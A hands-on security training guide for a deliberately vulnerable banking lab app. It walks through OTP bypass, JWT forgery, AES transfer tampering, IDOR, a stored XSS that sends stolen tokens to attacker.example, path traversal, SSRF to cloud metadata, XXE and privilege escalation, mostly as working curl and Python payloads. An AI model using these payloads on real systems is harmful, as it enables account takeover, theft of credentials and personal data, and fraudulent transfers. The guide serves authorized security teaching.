# NexBank Digital — Lab Guide

**Made by Ojas Patil**  
**RedCIPHER Security Training**
Focus: Broken Authentication · Cryptographic Failures · IDOR · Account Takeover

---

## Prerequisites

- NexBank running at http://nexbank.local
- Burp Suite (intercept proxy)
- Browser DevTools
- curl / Python requests

---

## Lab 1 — OTP Bypass (Account Takeover)

**Category:** Broken Authentication (A07:2021)
**Objective:** Login as any user without knowing their OTP.

### Vulnerability 1A: OTP in Response Header

```bash
curl -v -X POST http://nexbank.local/api/auth/send-otp \
  -H "Content-Type: application/json" \
  -d '{"mobile": "9100000002"}'

# Look for:  X-Debug-OTP: 4832
```

Use that OTP to complete login:
```bash
curl -X POST http://nexbank.local/api/auth/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"mobile": "9100000002", "otp": "4832"}'
```

### Vulnerability 1B: otp_bypass Parameter

```bash
curl -X POST http://nexbank.local/api/auth/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"mobile": "9100000002", "otp_bypass": true}'
```

### Vulnerability 1C: Rate Limit Bypass via X-Forwarded-For

The OTP rate limit is keyed on `X-Forwarded-For` — attacker-controlled:

```python
import requests

for otp in range(10000):
    r = requests.post(
        'http://nexbank.local/api/auth/verify-otp',
        json={'mobile': '9100000002', 'otp': str(otp).zfill(4)},
        headers={'X-Forwarded-For': f'10.0.0.{otp % 250}'}  # rotate IP
    )
    if r.json().get('verified'):
        print(f"[+] OTP found: {otp:04d}")
        break
```

**Impact:** Full account takeover of any user without credentials.

---

## Lab 2 — Predictable Password Reset Token + Host Header Injection

**Category:** Broken Authentication (A07:2021)
**Objective:** Reset any user's password and/or steal reset tokens.

### Vulnerability 2A: Host Header Injection

```bash
curl -X POST http://nexbank.local/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Host: attacker.com" \
  -d '{"email": "priya@nexbank.local"}'

# Response includes:
# "reset_link": "http://attacker.com/reset-password?token=<md5>"
# If victim clicks this link, the token goes to attacker.com
```

### Vulnerability 2B: Predictable Token

Token formula: `MD5(email + str(floor(time()/60)) + "nexbank_static_salt")`

```python
import hashlib, time, requests

email = "priya@nexbank.local"
salt  = "nexbank_static_salt"

# Try current and previous minute windows
for offset in range(-2, 3):
    window = int(time.time() // 60) + offset
    raw    = f"{email}{window}{salt}"
    token  = hashlib.md5(raw.encode()).hexdigest()
    print(f"[*] Trying token: {token}")
    r = requests.post(
        'http://nexbank.local/api/auth/reset-password',
        json={'token': token, 'new_password': 'hacked123'}
    )
    if r.ok:
        print(f"[+] SUCCESS with window={window}")
        break
```

### Vulnerability 2C: Token-less Reset (Logic Flaw)

No token required — just send `user_id` directly:

```bash
curl -X POST http://nexbank.local/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user_id": 2, "new_password": "hacked123"}'
```

**Impact:** Reset any account's password without access to their email.

---

## Lab 3 — Session Fixation

**Category:** Broken Authentication (A07:2021)
**Objective:** Hijack a victim's session by fixing the session ID before they log in.

### Attack Steps

1. **Attacker sets a known session_id cookie on the victim's browser** (via XSS, shared link, etc.):
   ```
   session_id=attacker_controlled_value
   ```

2. **Victim logs in** — the server accepts the existing `session_id` cookie and reuses it instead of generating a new one.

3. **Attacker uses the same session_id** to access the authenticated session:
   ```bash
   curl http://nexbank.local/api/auth/me \
     -H "Cookie: session_id=attacker_controlled_value; auth_token=<victim_token>"
   ```

### Proof of Concept (Burp)

1. Open Burp, visit http://nexbank.local/login
2. In Burp's cookie editor, set `session_id=FIXED123`
3. Log in normally as Arjun (9100000001 / password123)
4. Check response — `session_id` cookie is still `FIXED123`
5. In another browser with `session_id=FIXED123`, you're now logged in as Arjun

**Impact:** An attacker who can control a victim's browser cookies gains full session access after victim logs in.

---

## Lab 4 — 2FA Step-Skip

**Category:** Broken Authentication (A07:2021)
**Objective:** Bypass the second factor (OTP) of the two-step login flow.

### Normal Flow

```
POST /api/auth/login {mobile, password}
→ 200 {"step": 2, "user_id": 2}   ← server sets auth_step=2, auth_user_id=2 cookies

POST /api/auth/login (with auth_step=2 cookie)
→ 200 {"token": "..."}             ← OTP verification triggered by cookie
```

### Bypass: Forge Cookies for Any User

```bash
# Skip password — directly set 2FA cookies for the admin (user_id=5)
curl -X POST http://nexbank.local/api/auth/login \
  -H "Content-Type: application/json" \
  -H "Cookie: auth_step=2; auth_user_id=5" \
  -d '{}'

# Returns admin JWT token — no password or OTP supplied
```

**Impact:** Complete bypass of multi-factor authentication. Log in as any user including admin.

---

## Lab 5 — Hardcoded AES-256 Key in JS Bundle

**Category:** Cryptographic Failure (A02:2021)
**Objective:** Find the AES key in the JS bundle, decrypt intercepted transactions, modify and replay.

### Step 1: Find the Key

```bash
curl -s http://nexbank.local/static/js/app.js | grep -E "AES_KEY|AES_IV|API_KEY"

# Output:
# const NEXBANK_AES_KEY = "NexBankSecure2024";
# const NEXBANK_AES_IV  = "1234567890123456";
```

### Step 2: Intercept a Transfer in Burp

In Burp, intercept `POST /api/txn/transfer`. Request body:
```json
{"enc_payload": "Xk7mN2...base64...=="}
```

### Step 3: Decrypt with Python

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64, json

KEY = b"NexBankSecure2024\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # 32 bytes
IV  = b"1234567890123456"

def decrypt(b64ct):
    ct     = base64.b64decode(b64ct)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return json.loads(unpad(cipher.decrypt(ct), AES.block_size).decode())

def encrypt(data):
    from Crypto.Util.Padding import pad
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    ct     = cipher.encrypt(pad(json.dumps(data).encode(), AES.block_size))
    return base64.b64encode(ct).decode()

# Decrypt intercepted payload
plain = decrypt("PASTE_B64_HERE")
print(plain)  # {"from": "NXB1000000001", "to": "NXB1000000003", "amount": 1000.0, ...}

# Modify amount
plain['amount'] = 999999.0
plain['to']     = 'NXB1000000006'  # admin account

# Re-encrypt and replay
new_payload = encrypt(plain)
print(new_payload)
```

### Step 4: Replay Modified Payload

```bash
curl -X POST http://nexbank.local/api/txn/transfer \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <your_token>" \
  -d '{"enc_payload": "<new_payload>"}'
```

**Impact:** Any intercepted transaction can be decrypted, the amount/recipient modified, and replayed. Encryption provides no security.

---

## Lab 6 — MD5 Password Storage (No Salt)

**Category:** Cryptographic Failure (A02:2021)
**Objective:** Obtain password hashes and crack them.

### Step 1: Get Hashes

```bash
# Via debug endpoint (no auth required)
curl http://nexbank.local/debug/users | python3 -m json.tool | grep password_hash

# Or via IDOR (Lab 7)
curl http://nexbank.local/api/account/1/profile \
  -H "Authorization: Bearer <token>" | python3 -m json.tool
```

### Step 2: Crack with Hashcat

```bash
# Save hashes to file
echo "482c811da5d5b4bc6d497ffa98491e38" > hashes.txt

# MD5 (mode 0), no salt
hashcat -m 0 hashes.txt rockyou.txt

# Or use crackstation.net (online)
```

### Step 3: Verify

```bash
python3 -c "import hashlib; print(hashlib.md5(b'password123').hexdigest())"
# 482c811da5d5b4bc6d497ffa98491e38
```

**Impact:** All user passwords crackable via rainbow tables. No salt means identical passwords produce identical hashes — one crack reveals multiple accounts.

---

## Lab 7 — IDOR (Insecure Direct Object Reference)

**Category:** Broken Access Control (A01:2021)
**Objective:** Access other users' transactions, accounts, and PII without authorization.

### 7A: Transaction IDOR

```bash
TOKEN="<your_jwt_token>"

# Access any transaction — no ownership check
for i in $(seq 1 7); do
  curl -s "http://nexbank.local/api/txn/TXN-0000$i" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
done

# Dump all transactions in the system
curl "http://nexbank.local/api/txn/all" \
  -H "Authorization: Bearer $TOKEN"
```

### 7B: Account IDOR

```bash
# View any bank account balance
for id in 1 2 3 4 5 6; do
  curl -s "http://nexbank.local/api/account/$id/details" \
    -H "Authorization: Bearer $TOKEN"
done
```

### 7C: User Profile IDOR (PAN + Aadhaar exposure)

```bash
# Get any user's PAN, Aadhaar, and MD5 password hash
for id in 1 2 3 4 5; do
  curl -s "http://nexbank.local/api/account/$id/profile" \
    -H "Authorization: Bearer $TOKEN"
done
```

**Impact:** Full exposure of all customer PII, financial data, and credentials. Regulatory breach (PCI-DSS, DPDP Act).

---

## Lab 8 — JWT Vulnerabilities

**Category:** Broken Authentication (A07:2021)
**Objective:** Forge admin tokens using three different JWT attack techniques.

### 8A: Weak Secret — Forge Admin Token

```python
import jwt, time

SECRET  = "nexbank2024"   # from debug/config or app.js
payload = {
    "user_id":   5,
    "user_code": "NXB9999999",
    "role":      "admin",
    "name":      "Admin NexBank",
    "email":     "admin@nexbank.local",
    "iat":       int(time.time()),
    "exp":       int(time.time()) + 86400,
}
token = jwt.encode(payload, SECRET, algorithm="HS256")
print(token)
```

```bash
# Use forged token
curl http://nexbank.local/api/admin/config \
  -H "Authorization: Bearer <forged_token>"
```

### 8B: Algorithm None — Unsigned Token

```python
import base64, json

header  = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 5, "role": "admin", "name": "Admin"}

def b64(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()

token = f"{b64(header)}.{b64(payload)}."
print(token)
```

```bash
curl http://nexbank.local/api/admin/users \
  -H "Authorization: Bearer <alg_none_token>"
```

### 8C: Brute-Force the Secret (Hashcat)

```bash
# Extract token from browser localStorage / Burp
# Save to token.txt and brute-force the signing secret
hashcat -a 0 -m 16500 token.txt wordlists/jwt_secrets.txt

# Common secrets to try manually:
# secret, secret123, nexbank, nexbank2024, password, admin, 123456
python3 -c "
import jwt
for s in ['secret','secret123','nexbank','nexbank2024','admin']:
    try:
        jwt.decode('<paste_token>', s, algorithms=['HS256'])
        print(f'[+] Secret: {s}'); break
    except: pass
"
```

**Impact:** Admin account takeover, access to all user data, JWT secrets, AES keys, and DB credentials via /api/admin/config.

---

## Lab 9 — Stored XSS (Transaction Description)

**Category:** Cross-Site Scripting (A03:2021)
**Objective:** Steal a victim's JWT the moment they view their dashboard.

`description` in `POST /api/txn/transfer` is stored verbatim and rendered via raw
`innerHTML` concatenation in both `dashboard.html` (Recent Transactions) and
`transactions.html` (full statement) — no escaping anywhere in the chain. Since
Lab 7 has no IDOR check on `to_account`, you can transfer to *any* account number,
so the payload lands in an arbitrary victim's dashboard.

`<script>` tags inserted via `innerHTML` do **not** execute in the browser — use an
event-handler-based payload instead:

```bash
TOKEN="<attacker_jwt_token>"

curl -X POST http://nexbank.local/api/txn/transfer \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{
    "from_account": "NXB1000000001",
    "to_account":   "NXB1000000003",
    "amount": 1,
    "description": "<img src=x onerror=\"fetch(\x27https://attacker.example/c?t=\x27+localStorage.getItem(\x27nexbank_token\x27))\">"
  }'
```

Note: the frontend normally AES-encrypts the transfer body before sending
(`enc_payload`) — see Lab 5 for the key/IV — but `txn.py` accepts a plain JSON body
too if `enc_payload` is absent, so no encryption is needed for this PoC.

When the victim (account `NXB1000000003`'s owner) next opens `/dashboard`, the
`onerror` handler fires and exfiltrates their `nexbank_token` from `localStorage`
to the attacker's server — a stolen JWT good for full account access until it expires.

**Impact:** Any authenticated user can achieve session hijacking against any other
user who ever receives a transfer from them, with zero interaction beyond a normal
login.

---

## Lab 10 — Path Traversal (Statement Download)

**Category:** Broken Access Control / Path Traversal (A01:2021)
**Objective:** Read arbitrary files on the server via the statement download endpoint.

```bash
TOKEN="<your_jwt_token>"

# Legitimate use
curl "http://nexbank.local/api/account/statement/download?file=statement_sample.txt" \
  -H "Authorization: Bearer $TOKEN" -o statement.txt
```

### Step 1: The classic payload — /etc/passwd

`file` is joined onto the statements directory with `os.path.join()`, but Python's
`os.path.join()` silently **discards the base directory entirely** when the second
argument is an absolute path — so you don't even need `../` sequences:

```bash
# Absolute path — bypasses the base directory outright
curl "http://nexbank.local/api/account/statement/download?file=/etc/passwd" \
  -H "Authorization: Bearer $TOKEN"

# Classic relative traversal — same result, normpath collapses the '../' chain
curl "http://nexbank.local/api/account/statement/download?file=../../../../etc/passwd" \
  -H "Authorization: Bearer $TOKEN"
```

Testing locally on Windows instead of the docker container? The identical bug
reaches the Windows equivalent:

```bash
curl "http://localhost:5000/api/account/statement/download?file=C:\Windows\win.ini" \
  -H "Authorization: Bearer $TOKEN"

curl "http://localhost:5000/api/account/statement/download?file=..\..\..\Windows\win.ini" \
  -H "Authorization: Bearer $TOKEN"
```

### Step 2: Escalate — read the app's own secrets

Beyond generic OS files, the same bug reaches the application's own source tree:

```bash
curl "http://nexbank.local/api/account/statement/download?file=../config.py" \
  -H "Authorization: Bearer $TOKEN"

# Leaks: SECRET_KEY, AES_KEY, AES_IV, JWT_SECRET, RESET_TOKEN_SALT — every
# secret Labs 2, 5, and 8 depend on, all from one authenticated GET request.
```

**Impact:** Arbitrary file read as the application user — classic OS file
disclosure (`/etc/passwd`, `win.ini`) to prove the traversal, escalating to full
application secret disclosure that unlocks every crypto-dependent attack in this
lab (JWT forgery, AES decryption, reset token prediction).

---

## Lab 11 — SSRF via PDF Generation (Receipt Letterhead)

**Category:** Server-Side Request Forgery (A10:2021)
**Objective:** Use the receipt PDF's letterhead-logo feature to reach services
that aren't otherwise exposed outside the docker network — and see the result
rendered directly in the downloaded file.

This mirrors a very common real-world bug class: PDF-generation pipelines
(wkhtmltopdf, headless Chrome, ReportLab/fpdf-based renderers) that fetch
attacker-controlled image/resource URLs server-side while building the
document. Here, `GET /api/account/receipt/download` builds a real PDF and
fetches `logo_url` server-side to embed as the bank letterhead — no
allow-list, no scheme restriction, no block on internal or link-local ranges.

```bash
TOKEN="<your_jwt_token>"

# Legitimate use — downloads a normal-looking receipt
curl "http://nexbank.local/api/account/receipt/download?txn_id=TXN-00001" \
  -H "Authorization: Bearer $TOKEN" -o receipt.pdf

# Port-scan / fingerprint an internal-only service (redis is never proxied by nginx)
curl "http://nexbank.local/api/account/receipt/download?txn_id=TXN-00001&logo_url=http://redis:6379/" \
  -H "Authorization: Bearer $TOKEN" -o ssrf_redis.pdf

# Reach the app container directly by its internal docker DNS name
curl "http://nexbank.local/api/account/receipt/download?txn_id=TXN-00001&logo_url=http://app:5000/debug/config" \
  -H "Authorization: Bearer $TOKEN" -o ssrf_debug_config.pdf
```

Open the resulting PDFs: when `logo_url` doesn't point at a real image, the
endpoint prints whatever it fetched — status code, content type, and up to
1500 characters of the raw response body — straight onto the receipt page.
`ssrf_debug_config.pdf` should show `app:5000/debug/config`'s JSON body
(JWT_SECRET, AES_KEY, DB credentials) rendered in the PDF itself.

On real cloud infrastructure (AWS/GCP/Azure), the same request pattern targets
instance metadata instead:

```bash
curl "http://nexbank.local/api/account/receipt/download?logo_url=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer $TOKEN" -o ssrf_metadata.pdf
```

### Escalation: SSRF → Local File Read via `file://`

`logo_url`'s scheme is never validated — it isn't restricted to `http(s)://` at
all. Swap the scheme to `file://` and the exact same parameter reads local
files directly, no network request involved:

```bash
# Linux/docker container filesystem
curl "http://nexbank.local/api/account/receipt/download?logo_url=file:///etc/passwd" \
  -H "Authorization: Bearer $TOKEN" -o lfi_passwd.pdf

# This app's own secrets — docker WORKDIR is /app
curl "http://nexbank.local/api/account/receipt/download?logo_url=file:///app/config.py" \
  -H "Authorization: Bearer $TOKEN" -o lfi_config.pdf

# Testing on Windows instead of the docker container
curl "http://localhost:5000/api/account/receipt/download?logo_url=file://C:/Windows/win.ini" \
  -H "Authorization: Bearer $TOKEN" -o lfi_winini.pdf
```

This is the same escalation path behind a long list of real CVEs: code that
fetches a "remote resource" URL server-side, never checks the scheme, and the
underlying fetch logic (or, here, an explicit `file://` branch mirroring how
some URL-fetching libraries behave) happily opens local files just as readily
as it opens sockets.

**Impact:** A single unvalidated `logo_url` parameter on a routine "download my
receipt" feature delivers three distinct outcomes depending on scheme —
internal network pivot (SSRF), cloud credential theft (metadata endpoint), and
full local file read (LFI via `file://`) — with the proof of each sitting
directly inside a client-facing PDF, not a blind/inferred response.

---

## Lab 12 — Hidden Endpoint via Leaked Swagger Docs

**Category:** Broken Access Control / Security Misconfiguration (A01/A05:2021)
**Objective:** Discover an undocumented admin endpoint through an exposed API
spec, then use it for instant account takeover.

### Step 1: Find the docs

```bash
curl http://nexbank.local/api/openapi.json | python3 -m json.tool
# Or browse http://nexbank.local/api/docs — nothing in the UI links here
```

Look for `/api/admin/impersonate/{user_id}` — it's marked "INTERNAL-ONLY" in the
spec's description and isn't called from any page in the app.

### Step 2: Call it directly as a low-privilege customer

```bash
TOKEN="<any_authenticated_customer_jwt>"

curl -X POST http://nexbank.local/api/admin/impersonate/5 \
  -H "Authorization: Bearer $TOKEN"

# Returns a fully valid JWT for user_id=5 (Admin NexBank) — no role check,
# same broken-access-control pattern as the rest of /api/admin/*
```

**Impact:** Immediate takeover of any account, including admin, from any
authenticated session — the endpoint's existence was the only thing keeping it
"protected," and the leaked docs gave that away.

---

## Lab 13 — Supply Chain Risk via Exposed `package.json`

**Category:** Vulnerable and Outdated Components (A06:2021)
**Objective:** Identify supply-chain risk from a build artifact accidentally
left in the public `static/` directory.

```bash
curl http://nexbank.local/static/package.json | python3 -m json.tool
```

Two distinct findings:

**13A — Known-CVE dependencies.** Check each pinned version against the OSV/NVD
database or `npm audit`:
- `axios@0.21.0` — SSRF (CVE-2020-28168)
- `lodash@4.17.15` — Prototype Pollution (CVE-2020-8203)
- `minimist@1.2.5` — Prototype Pollution (CVE-2021-44906)
- `jquery@3.4.1` — Prototype Pollution / XSS (CVE-2020-11022/11023)

**13B — Dependency confusion.** `@nexbank-internal/otp-widget` and
`@nexbank-internal/kyc-uploader` are scoped packages pointed at
`https://npm-internal.nexbank.local/` via `publishConfig`. If that scope was
never claimed on the public npm registry, an attacker can publish a
same-named malicious package publicly; a misconfigured build (or one that
doesn't pin the internal registry correctly) resolves it from the public
registry instead and pulls attacker-controlled code straight into the build.

```bash
# Confirm the scope isn't claimed publicly (would 404 if unclaimed)
curl -s https://registry.npmjs.org/@nexbank-internal/otp-widget
```

**Impact:** Recon into internal infrastructure (private registry, internal git
host) plus two independent supply-chain attack paths — exploiting a known CVE
in a pinned dependency, or a dependency-confusion publish against an unclaimed
internal scope.

---

## Lab 14 — XXE (Bulk Transfer Batch Upload)

**Category:** XML External Entities (A05:2021)
**Objective:** Read local files or reach internal services through the
NEFT/RTGS bulk-transfer XML upload feature.

Real banks widely process batch payments as XML (ISO 20022-style messages).
`POST /api/txn/bulk-upload` mirrors that with a simple schema:

```xml
<BulkTransferBatch>
  <Transfer>
    <FromAccount>NXB1000000001</FromAccount>
    <ToAccount>NXB1000000003</ToAccount>
    <Amount>500.00</Amount>
    <Description>Vendor payment</Description>
  </Transfer>
</BulkTransferBatch>
```

It's parsed with `lxml.etree.XMLParser(resolve_entities=True, no_network=False)`
— `resolve_entities=True` is actually **lxml's own default**, a very common
real-world gotcha; `no_network=False` additionally lets entities resolve over
HTTP, not just local files. Whatever a DOCTYPE-declared entity resolves to
gets reflected straight back in the JSON response — no blind/out-of-band
technique needed.

### Step 1: Local file read

```bash
TOKEN="<your_jwt_token>"

curl -X POST http://nexbank.local/api/txn/bulk-upload \
  -H "Content-Type: application/xml" -H "Authorization: Bearer $TOKEN" \
  --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE BulkTransferBatch [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<BulkTransferBatch>
  <Transfer>
    <FromAccount>NXB1000000001</FromAccount>
    <ToAccount>NXB1000000003</ToAccount>
    <Amount>1</Amount>
    <Description>&xxe;</Description>
  </Transfer>
</BulkTransferBatch>
XML
```

The response's `parsed_transfers[0].description` contains `/etc/passwd`'s
contents. Swap the SYSTEM identifier for `file:///app/config.py` to leak this
app's own `AES_KEY`/`JWT_SECRET`/`RESET_TOKEN_SALT` instead.

### Step 2: SSRF via external entity

```xml
<!DOCTYPE BulkTransferBatch [
  <!ENTITY xxe SYSTEM "http://redis:6379/">
]>
```

Reaches the same internal-only services as Lab 11 — Redis, `app:5000/debug/config`
— through an entirely different code path (lxml's entity resolver instead of
`requests.get()`), which is exactly why both need fixing independently; patching
one doesn't patch the other.

### Step 3 (UI): try it from the app itself

Go to `/transfer` → scroll to **"Bulk Transfer Batch Upload"** → paste either
payload above into the textarea → **Upload & Parse Batch**. The raw JSON
response (including the resolved entity content) renders directly on the page.

**Impact:** A single XML upload feature yields both local file disclosure and
internal network access, independent of the JSON-based SSRF in Lab 11 — the
same target endpoints are reachable through two unrelated code paths, so a
scanner or reviewer that only checks one won't catch the other.

---

## Lab 15 — Privilege Escalation (Role Management)

**Category:** Broken Access Control (A01:2021)
**Objective:** Go from a normal customer session to `role: admin` with no
credentials beyond your own login — three independent ways.

### Vector A: Self-service tier upgrade with no allow-list

`POST /api/account/request-role-upgrade` is modeled on a real "upgrade my
account" feature (basic → premium/corporate/NRI), but applies whatever
`requested_role` you send immediately, with no approval step and no check
against the tiers it's actually supposed to offer:

```bash
TOKEN="<your_customer_jwt_token>"

curl -X POST http://nexbank.local/api/account/request-role-upgrade \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"requested_role": "admin"}'

# {"message": "Role upgrade approved automatically...", "old_role": "customer", "new_role": "admin"}
```

Your **existing** JWT still says `role: customer` (JWTs aren't re-issued on
role change) — call `/api/auth/me` or log in again to get a fresh token
reflecting the new role, or just re-forge one with the Lab 8 technique now
that the DB row itself says admin.

### Vector B: Unguarded admin role-change endpoint

`PUT /api/admin/users/{id}/role` (routes/admin.py) has `@require_auth` but,
like every other route in that file, **no role check at all** — any
authenticated customer can change *anyone's* role, including their own:

```bash
curl -X PUT http://nexbank.local/api/admin/users/2/role \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "admin"}'
```

### Vector C: Mass assignment (Lab 6, same outcome)

```bash
curl -X PUT http://nexbank.local/api/account/profile \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "admin"}'
```

**Impact:** Three unrelated code paths — a customer-facing feature, an
"admin" API with a missing authorization check, and a generic profile-update
endpoint — all converge on the same result. Fixing one doesn't fix the other
two; each needs its own server-side role/permission check that verifies the
*caller's* privilege level, not just that they're logged in at all.

---

## Chained Attack — Full Account Takeover Scenario

```
1. [Debug endpoint] GET /debug/users → dump all emails + MD5 hashes
2. [Lab 6] Crack MD5 hash            → get plaintext password
3. [Lab 2] POST /auth/forgot-password with X-Forwarded-Host=attacker.com → token captured
4. [Lab 2] POST /auth/reset-password {user_id: <id>, new_password: "owned"}  → no token needed
5. [Lab 1] POST /auth/verify-otp {otp_bypass: true, mobile: "..."}  → login bypassed
6. [Lab 4] Cookie: auth_step=2; auth_user_id=5 → admin JWT obtained
7. [Lab 7] Enumerate all accounts + transactions
8. [Lab 5] Decrypt enc_payload, modify amount, replay transfer to own account
```

### Fast Path — Recon-Only Admin Takeover

No password guessing or MD5 cracking — pure attack-surface discovery, chained
straight to admin:

```
1. [Lab 13] GET /static/package.json      → confirms internal build artifacts leak onto the web root
2. [Lab 10] GET /api/account/statement/download?file=../config.py → JWT_SECRET leaked
3. [Lab 8]  Forge a JWT for any user_id with the leaked JWT_SECRET → self-issued customer session, no login needed
4. [Lab 12] GET /api/openapi.json         → finds /api/admin/impersonate/{user_id}, unlinked anywhere in the UI
5. [Lab 12] POST /api/admin/impersonate/5 with the forged token from step 3 → admin JWT
```

Every credential used in this chain was manufactured from leaked source code and
a leaked API spec — none of it came from guessing, cracking, or a real login.

---

## Recommended Tools

| Tool | Use |
|------|-----|
| Burp Suite | Intercept, modify, replay requests |
| jwt.io | Decode and inspect JWT tokens |
| CrackStation.net | Online MD5 cracking |
| hashcat | Offline MD5 / JWT secret brute-force |
| Python requests | Scripted attacks |
| curl | Quick endpoint probes |

---

*RedCIPHER Security Training — Made by Ojas Patil — For authorized lab use only.*
